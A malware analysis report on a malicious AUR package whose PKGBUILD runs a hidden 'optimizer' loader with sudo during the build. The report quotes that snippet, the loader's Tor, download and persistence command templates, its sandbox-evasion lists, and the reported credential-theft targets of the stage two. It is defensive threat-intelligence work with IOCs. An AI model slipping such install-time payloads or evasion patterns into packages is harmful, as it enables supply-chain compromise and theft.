# Analysis Report: Malicious `meshcore-open-git` AUR Package

## Executive summary

The analyzed AUR snapshot contains a malicious source entry named `optimizer`. Its
`PKGBUILD` invokes that file with `sudo` during `build()`, giving it root privileges:

```bash
source=(
  "${_pkgname}::git+https://${_githost}/${_gituser}/${_gitname}.git"
  "${_pkgname}.desktop"
  'optimizer'
)

sha256sums=(
  'SKIP'
  '693903df45168de884191be566334fad4c5bd829b36f7e6c33440cf2efa79c5a'
  'SKIP'
)

build() {
  sudo "$srcdir/optimizer"
  # ... legitimate-looking Flutter build follows
}
```

The recovered `optimizer` artifact, preserved locally as `infected-bin`, is a
stripped x86-64 Linux ELF loader written in C and compiled with GCC 16.1.1. It
screens the environment for analysis, establishes persistence, installs and
manages a private Tor client, connects through SOCKS5 to an onion service,
downloads a second-stage archive over HTTP, extracts an `agent`, appends random
trailing bytes to change its hash, and launches it through a transient user
systemd unit.

The onion service was unavailable during this investigation. The exact
second-stage bytes were therefore not recovered.

No analyzed malware was executed, debugged, loaded, or emulated during this
investigation. Results were obtained through static parsing, disassembly,
decompilation, and an independently implemented offline ChaCha20 string-table
decoder.

## Scope and artifacts

Analysis date: 2026-08-02 UTC

### First-stage ELF

| Property | Value |
|---|---|
| Local name | `infected-bin` |
| Size | 43,640 bytes |
| SHA-256 | `e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77` |
| SHA-1 | `069380d8a59b806120d75c554827b9ec9f5e583a` |
| MD5 | `76b7981f13d86374414e4c887b77539d` |
| Format | ELF64, x86-64, little-endian, PIE |
| Linkage | Dynamically linked; `/lib64/ld-linux-x86-64.so.2` |
| Compiler marker | `GCC: (GNU) 16.1.1 20260725` |
| Symbols | Stripped |
| Protections | NX, PIE, stack canary; partial RELRO |
| Local mode after quarantine | `0664` (not executable) |

VirusTotal:

- [Detection report](https://www.virustotal.com/gui/file/e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77/detection)
- [Relations](https://www.virustotal.com/gui/file/e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77/relations)
- [Behavior](https://www.virustotal.com/gui/file/e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77/behavior)
- [Details](https://www.virustotal.com/gui/file/e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77/details)

### AUR snapshot

| Artifact | SHA-256 |
|---|---|
| `malicious-aur-80529dcb0d9ee567fbb963cd8b7b33566de3f31c.tar.gz` | `b97a762f886fa62a3908568cdf8695409d9d5e42a9f85e0ff5ee737f172c78d4` |
| Extracted `PKGBUILD` | `6126c3e44406592f002ce9465014c2fe869bd8f308e2c86286f6a13042e521e1` |

Snapshot identifier:

```text
80529dcb0d9ee567fbb963cd8b7b33566de3f31c
```

Package metadata impersonates or wraps:

```text
Package: meshcore-open-git
Upstream: https://github.com/zjs81/meshcore-open
Declared maintainer: dreieck
```

These strings describe package metadata and do not, by themselves, establish
that the named upstream project or declared maintainer authored the malicious
file.

## Infection vector

The malicious source is disguised as an optimization helper:

```text
optimizer
```

Its checksum is explicitly skipped, and it is executed with `sudo` before the
legitimate Flutter build:

```bash
sudo "$srcdir/optimizer"
```

This is especially severe because ordinary AUR package builds should not invoke
`sudo` internally. A user who approved this command could have executed the
loader as root before any package installation occurred.

## Embedded-string protection

The ELF stores 154 encrypted configuration strings. The decoder at virtual
address `0x3240` uses ChaCha20:

- Constant: `expand 32-byte k`
- Quarter-round rotations: 16, 12, 8, and 7
- Per-entry 32-byte keys
- Per-entry nonces
- A length table and offset table
- Ciphertext in `.rodata`

The accessor at `0x34d0` takes a numeric string ID and returns its decrypted
value. The offline reimplementation is in `analysis/extract_strings.py`.

## Execution overview

```text
PKGBUILD executes optimizer with sudo
              |
              v
Resolve /proc/self/exe and perform anti-analysis checks
              |
              v
Remove or replace prior persistence; establish new persistence
              |
              v
Test Internet access using 1.1.1.1:443 and 8.8.8.8:443
              |
              v
Install/start a private Tor client under /tmp
              |
              v
SOCKS5 connection to onion C2 on TCP port 80
              |
              v
HTTP GET / and save response as /dev/shm/.agent.bin
              |
              v
Extract /tmp/linux-x86_64/agent
              |
              v
Append 64-256 random bytes and write a randomized executable
              |
              v
Launch through systemd-run --user --scope
```

## Anti-analysis and environment screening

### Debugger detection

The loader opens:

```text
/proc/self/status
```

and parses:

```text
TracerPid:
```

A nonzero tracer PID causes an early exit.

### Hostname/environment wordlist

The binary checks for analysis-oriented words including:

```text
malware
vmware
seclab
sandbox
cuckoo
analysis
virus
vxbox
honeypot
maltest
triage
anyrun
cape
remnux
flare
sndbox
```

### CI detection

It checks many CI environment variables, including:

```text
GITHUB_ACTIONS
GITLAB_CI
TRAVIS
CIRCLECI
JENKINS_URL
BUILD_BUILDURI
CODEBUILD_BUILD_ID
BUILDKITE
APPVEYOR
BITBUCKET_BUILD_NUMBER
DRONE
SEMAPHORE
TEAMCITY_VERSION
bamboo_agentId
BITRISE_IO
CIRRUS_CI
CF_BUILD_ID
VERCEL
```

This helps explain why an automated sandbox may fail to obtain stage two.

## Self-location and duplicate-instance handling

Function `0x3539` resolves the current executable through:

```text
/proc/self/exe
```

The resulting path is reused when inspecting persistence entries and locating
the current installation.

The loader uses `.lck` and `.done` artifacts and `flock()` to coordinate
instances. It can read a stored PID, issue `SIGTERM`, check whether the process
remains, and then issue `SIGKILL` if required.

## Connectivity gate

Before attempting Tor/C2 communication, the loader tests TCP connectivity to:

```text
1.1.1.1:443
8.8.8.8:443
```

If neither endpoint is reachable, it sleeps approximately five seconds and
retries. These addresses are connectivity probes, not the malware C2.

## Private Tor installation and management

The loader does not require the system Tor package. It can retrieve the Tor
Expert Bundle from:

```text
https://archive.torproject.org/tor-package-archive/torbrowser/16.0a7/tor-expert-bundle-linux-x86_64-16.0a7.tar.gz
```

The embedded download template is:

```bash
curl -sLk --max-time 120 -o '%s' '%s' 2>/dev/null
```

Security-relevant properties:

- `-k` disables TLS certificate validation.
- No archive signature verification was identified.
- No expected checksum verification was identified.

The loader extracts and manages Tor under `/tmp`, with artifacts resembling:

```text
/tmp/tb
/tmp/tb/data
/tmp/tb/tor.log
/tmp/.torrc
/tmp/.lck
```

The embedded launch template is:

```bash
LD_LIBRARY_PATH=/tmp/tb /tmp/tb/tor \
  --DataDirectory /tmp/tb/data \
  --SocksPort %d \
  --ClientOnly 1 \
  --Log 'notice file %s' >/dev/null 2>&1 &
```

It starts searching for a local SOCKS port at:

```text
127.0.0.1:7050
```

It consumes Tor output in a background worker and searches for:

```text
Bootstrapped 100%
```

It may terminate an older managed Tor process before launching a replacement.

## C2 and HTTP protocol

### Onion service

```text
p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion
```

### SOCKS5 sequence

The loader connects to its local Tor SOCKS listener and sends an unauthenticated
SOCKS5 method negotiation:

```hex
05 01 00
```

It expects:

```hex
05 00
```

It then requests a domain-name connection to the onion service on TCP port 80.
The request is structurally:

```text
VER=05 CMD=01 RSV=00 ATYP=03 DOMAIN=<onion> PORT=0050
```

### HTTP request

After the SOCKS5 tunnel is established, it sends:

```http
GET / HTTP/1.1
Host: p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion
User-Agent: curl/8.9.1
Connection: close

```

This is plain HTTP inside the Tor circuit; it is not HTTPS.

### HTTP response parser

The loader:

- Accumulates up to approximately 16 KiB of response headers.
- Searches for `\r\n\r\n`.
- Parses the numeric HTTP status from the first response line.
- Recognizes `Content-Length:` and `content-length:`.
- Does not appear to implement chunked transfer decoding.
- Reads exactly `Content-Length` bytes when available.
- Otherwise reads until EOF.
- Requires status `200` before continuing with installation.

The response body is stored as:

```text
/dev/shm/.agent.bin
```

## Stage-two extraction and launch

On a successful response, the loader executes a command equivalent to:

```bash
tar xzf '/dev/shm/.agent.bin' -C '/tmp' 2>/dev/null
```

It expects the archive to contain:

```text
/tmp/linux-x86_64/agent
```

No validation of archive contents, signatures, or hashes was identified before
processing the extracted agent.

### Per-host hash randomization

The loader reads the complete extracted `agent`, generates between 64 and 256
pseudorandom bytes, and appends them to the ELF. It writes this modified buffer
under a generated name and applies mode `0755`.

Linux ELF loading normally ignores bytes beyond the data described by the ELF
headers. The appended overlay therefore changes the file hash without changing
the program's expected execution. This likely creates a different SHA-256 for
each installed copy and frustrates exact-hash hunting.

The original stage-two content can potentially be normalized from a recovered
copy by calculating the maximum file-backed extent described by its ELF headers
and removing the trailing overlay before hashing. This should be validated on a
copy and not performed destructively on evidence.

### Launch command

The generated payload is launched with a command equivalent to:

```bash
systemd-run --user --scope --unit=<generated-name> \
  <generated-payload-path> >/dev/null 2>&1
```

The `.done` marker is created after a successful stage transition.

## Generated names

The loader generates pronounceable-looking identifiers using:

```text
Vowels:     aeiou
Consonants: bcdfghjklmnprstvwx
Pattern:    brcrdrfrgrkrprtrvrblclflglklplslvlzl
```

Generated identifiers are used or appear intended for:

- Payload filenames
- systemd service names
- Transient unit names
- Lock/marker names
- Installation identifiers

Filename-only detection is therefore unreliable.

## Linux persistence

### Root systemd persistence

Root-level service directory:

```text
/etc/systemd/system
```

Embedded service template:

```ini
[Unit]
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
```

Relevant commands:

```bash
systemctl daemon-reload 2>/dev/null
systemctl enable --now '<service>' 2>/dev/null
systemctl disable --now '<service>' 2>/dev/null
```

### User systemd persistence

User service directory:

```text
$HOME/.config/systemd/user
```

Embedded template:

```ini
[Unit]
After=default.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
```

Relevant commands:

```bash
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable --now '<service>'
systemctl --user disable --now '<service>' 2>/dev/null
loginctl enable-linger
```

### Cron fallback

The binary contains both system and per-user cron forms:

```text
@reboot root %s
@reboot %s
```

It can filter old matching entries out of a crontab before installing a new
entry.

### Replacement of previous persistence

The loader scans `.service` files, reads their contents, and looks for either
the current executable path or:

```text
ExecStart=<current executable>
```

Matching services are disabled and removed, followed by a daemon reload. It
similarly removes matching cron entries. This is consistent with an update or
reinstallation mechanism.

## Extended-attribute marker

The ELF imports and calls both `getxattr()` and `setxattr()` using:

```text
security.selinux
```

The written value is a single byte:

```hex
01
```

Candidate marker files selected according to availability include:

```text
/run/utmp
/var/run/utmp
/var/log/hostd.log
/etc/resolv.conf
```

This appears to be state or reinfection-marker behavior, but the exact lifecycle
of the marker requires additional confirmation. On SELinux systems,
`security.selinux` is also a legitimate label attribute. Investigators must not
remove or replace it based solely on this report.

Read-only inspection command:

```bash
getfattr -n security.selinux \
  /run/utmp /var/run/utmp /var/log/hostd.log /etc/resolv.conf \
  2>/dev/null
```

## Cross-platform material

The encrypted string table contains Windows and macOS persistence and API
material, including:

- Windows Task Scheduler XML
- PowerShell `Invoke-WebRequest`
- Win32 process, socket, crypto, and COM API names
- macOS LaunchDaemon/LaunchAgent paths
- `launchctl` templates
- Apple property-list persistence templates

The analyzed artifact is a Linux ELF and cannot directly execute Windows PE or
macOS Mach-O behavior. These strings indicate a shared cross-platform loader
codebase or related builds, not that every embedded path is active on Linux.

## Imported capabilities

Notable active imports include:

```text
socket, connect, setsockopt, inet_addr, select
system, fork, execl, pipe, dup2, waitpid, kill
pthread_create, pthread_detach, pthread_cond_wait
open, fopen, fread, fwrite, remove, chmod
opendir, readdir, closedir
getxattr, setxattr
readlink, getenv, setenv, gethostname, geteuid
```

Cross-references show these are not merely unused imports. Examples include:

- 19 `system()` call sites
- 5 `connect()` call sites
- 2 `execl()` call sites
- Active `setxattr()` use
- Background thread creation

## Indicators of compromise

### File hashes

```text
First stage SHA-256:
e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77

First stage SHA-1:
069380d8a59b806120d75c554827b9ec9f5e583a

First stage MD5:
76b7981f13d86374414e4c887b77539d

AUR snapshot SHA-256:
b97a762f886fa62a3908568cdf8695409d9d5e42a9f85e0ff5ee737f172c78d4

PKGBUILD SHA-256:
6126c3e44406592f002ce9465014c2fe869bd8f308e2c86286f6a13042e521e1
```

### Network

```text
C2 onion:
p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion

HTTP method/path:
GET /

HTTP User-Agent:
curl/8.9.1

Local SOCKS start port:
127.0.0.1:7050

Connectivity probes:
1.1.1.1:443
8.8.8.8:443
```

### Files and directories

```text
/dev/shm/.agent.bin
/tmp/linux-x86_64/agent
/tmp/tb
/tmp/tb/data
/tmp/tb/tor.log
/tmp/.torrc
/tmp/.lck
/etc/systemd/system/*.service
$HOME/.config/systemd/user/*.service
```

Because installation names are randomized, the paths above are incomplete and
should be combined with content and behavioral detection.

### Commands and behavior

```text
systemd-run --user --scope --unit=
systemctl --user enable --now
loginctl enable-linger
LD_LIBRARY_PATH=/tmp/tb
Bootstrapped 100%
```

## Onion-service retrieval result

Tor successfully bootstrapped to 100% during the investigation. Attempts to
reach the onion returned SOCKS5 reply code 4, and Tor logged:

```text
No more HSDir available to query
```

This indicates that the onion service was unavailable or unpublished at that
time. No second-stage archive was created locally.

The C2 cannot be tested with ICMP `ping`; onion services have no public IP and
Tor does not transport ICMP. A SOCKS5 connection attempt is the appropriate
reachability test.

## Why the second stage may be absent from public repositories

- The onion service is currently unavailable.
- Automated sandboxes may trigger the debugger, hostname, or CI checks.
- Tor bootstrap may exceed sandbox time limits.
- The server may have been active only briefly.
- The loader appends a random overlay to the stage-two ELF, producing different
  whole-file hashes on different infections.
- VirusTotal sample downloads generally require appropriate account privileges.

Useful VirusTotal Intelligence pivots, where access permits:

```text
content:"p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion"
behavior_network:"p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion"
```

## Suggested host triage

Use these only on suspected affected systems. Do not execute any discovered
artifact.

```bash
sudo find /dev/shm /tmp /var/tmp \
  -type f \
  \( -name '.agent.bin' -o -name agent -o -name '*.tar.gz' \) \
  -ls 2>/dev/null
```

```bash
find "$HOME/.config/systemd/user" /etc/systemd/system /etc/cron.d \
  -type f -maxdepth 2 \
  -exec grep -IlE '/tmp/tb|/dev/shm/\.agent|systemd-run --user' {} + \
  2>/dev/null
```

```bash
sudo journalctl | grep -Ei \
  'meshcore|optimizer|systemd-run|/tmp/tb|\.agent\.bin|Bootstrapped 100%'
```

```bash
ps auxww | grep -E \
  '[/]tmp/tb/tor|LD_LIBRARY_PATH=/tmp/tb|systemd-run --user --scope'
```

Preserve any suspected files before remediation and record hashes, timestamps,
owners, permissions, xattrs, and associated journal entries.

## Static-analysis workflow and supporting files

Generated reports:

```text
analysis/main.c
analysis/string-decryptor.c
analysis/string-decoder-xrefs.txt
analysis/socks5.asm
analysis/http-download.asm
analysis/functions/
```

Offline string extractor:

```text
analysis/extract_strings.py
```

Useful reproduction commands:

```bash
file infected-bin
rabin2 -I infected-bin
rabin2 -i infected-bin
readelf -hW infected-bin
readelf -dW infected-bin
```

`ldd` was deliberately avoided. Debug mode (`r2 -d`) was not used.

## Confidence and unresolved questions

High confidence:

- The AUR package executes the malicious `optimizer` with `sudo`.
- The loader decrypts a ChaCha20-protected configuration table.
- It manages Tor and speaks SOCKS5 to the recovered onion service.
- It downloads an archive using HTTP `GET /`.
- It expects `linux-x86_64/agent`.
- It appends a random overlay to the extracted ELF.
- It launches the modified payload using `systemd-run --user --scope`.
- It implements systemd and cron persistence/removal routines.
- It implements debugger, hostname, and CI screening.

Moderate confidence:

- The random overlay is primarily intended to defeat exact hash matching.
- The xattr is used as an installation or reinfection marker.
- Cross-platform strings originate from sibling Windows/macOS loader builds.

Unresolved:

- Exact second-stage functionality and original hash.
- Whether the C2 serves victim-specific or time-varying payloads.
- Complete mapping of generated filenames on a specific infected host.
- Campaign attribution and relationship to other loader families.
- Exact duration for which the onion service was active.

## Safety note

Removing executable permission bits reduces accidental execution but is not a
security boundary. An ELF can still be invoked explicitly through its dynamic
loader, and scripts can be passed to an interpreter. Analyze artifacts only in
an isolated environment, avoid live debugging on a workstation, and do not use
the malware itself to retrieve stage two.

## Stage-two intelligence from external report

An external analyst report was located in the public gist [AUR
validator.malware (stage2 agent linux x86_64)](https://gist.github.com/ysf/57850cdee152da066ac51c07a452e883).
It identifies a 3,668,704-byte ELF64 x86-64 PIE stage-two agent with:

```text
SHA-256:
06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502
```

VirusTotal pivots:

- [Detection](https://www.virustotal.com/gui/file/06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502/detection)
- [Relations](https://www.virustotal.com/gui/file/06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502/relations)
- [Behavior](https://www.virustotal.com/gui/file/06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502/behavior)
- [Details](https://www.virustotal.com/gui/file/06c857c8ca798d50c765b4de39e6c4f272ecb57bc8316a8ed4c0fdf02fb59502/details)

The gist is an intelligence source, not an independently verified local copy.

### Reported stage-two capabilities

The stage two is described as a Rust infostealer, interactive RAT, and SSH worm.
Reported targets include browser cookies and credentials (Chromium, Edge, Brave,
Vivaldi, Yandex, Firefox, LibreWolf, and Tor), Chromium Safe Storage keys,
Exodus/Electrum/Ledger/Trezor/Monero/Wasabi/Phantom/MetaMask wallets,
1Password/Bitwarden/LastPass, Telegram `tdata`, Discord tokens, Slack tokens,
cloud and developer credentials, GitHub/GitLab tokens, OpenAI/Anthropic/Gemini
keys, Vault tokens, Cursor tokens, SSH keys, clipboard history, removable media,
and cloud metadata.

It reportedly patches Exodus `app.asar` to inject JavaScript for seed theft and
spreads laterally over SSH/SCP using `StrictHostKeyChecking=no`, `BatchMode=yes`,
and background execution.

Reported metadata targets include:

```text
169.254.169.254
169.254.170.2
GCE metadata
AWS STS GetCallerIdentity
AWS STS AssumeRoleWithWebIdentity
```

### Additional stage-two anti-analysis

The external report adds container `CapEff` inspection, DMI fingerprints for
AWS/EC2, GCP/GCE, Azure/Hyper-V, Alibaba, and Oracle, plus references to
Volatility, Wireshark, ClamAV, osquery, Sliver, Empire, Mythic, Merlin,
Metasploit, and AdaptixC2. It also names `nijin-lab` as an additional hostname
token.

### Additional stage-two persistence

Reported installation/staging paths include:

```text
/var/lib//
$HOME/./
/dev/shm
/etc/systemd/system/*.service
$HOME/.config/systemd/user/*.service
/etc/cron.d
```

The report describes root cron entries scheduled every five minutes:

```text
*/5 * * * * root ...
```

and user-crontab `@reboot` persistence. It also describes macOS LaunchAgent/
LaunchDaemon and Windows scheduled-task variants in sibling builds.

### Stage-two encrypted C2

The stage two reportedly uses a custom encrypted Tor channel based on:

```text
X25519 + HKDF + ChaCha20-Poly1305
```

Reported labels include `csi-a2s`, `csi-s2a`, `agent2server`, `s2a`,
`hkdf-blob`, `aead-open`, `csi-blob:q`, and `x25519_server_pub`.

The report states that a sealed 60-byte blob consists of a 12-byte nonce and
48-byte ciphertext, which decrypts to key material used with X25519. The reported
server static public-key IOC is:

```text
2d15205b422f6137ab08c728e2ae0ca38d07b5153723b373d12532d8bebb6a48
```

### Stage-two beacon and commands

Reported beacon fields:

```text
hwid, hostname, username, cpu, cpu_cores, active_user, os, campaign,
version, tor_port, locale, public_ip, agent_name
```

Reported messages include:

```json
{"t":"ping"}
{"t":"pong"}
{"t":"cmd","id":...,"command":...,"shell":...,"cap":...}
{"t":"cancel","id":...,"sig":...}
```

Reported command runners are `bash_run`, `python_run`, `python3_run`, and
`ps_run`. Loot messages reportedly contain `t`, `loot`, `type`, `meta`, `ts`,
`seq`, `source`, `pid`, and `data` fields.

### Stage-two retrieval status

Exact-hash web searches for the reported stage-two SHA-256 produced no public
mirror. VirusTotal may expose metadata, behavior, relationships, or a download
depending on account privileges. The first-stage random trailing overlay means
related stage-two copies may not share one whole-file hash.

Useful VT Intelligence pivots include:

```text
content:"p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion"
content:"x25519_server_pub"
content:"2d15205b422f6137ab08c728e2ae0ca38d07b5153723b373d12532d8bebb6a48"
```

Do not upload the local first-stage sample or submit the onion URL to a public
service without considering disclosure and operational consequences.
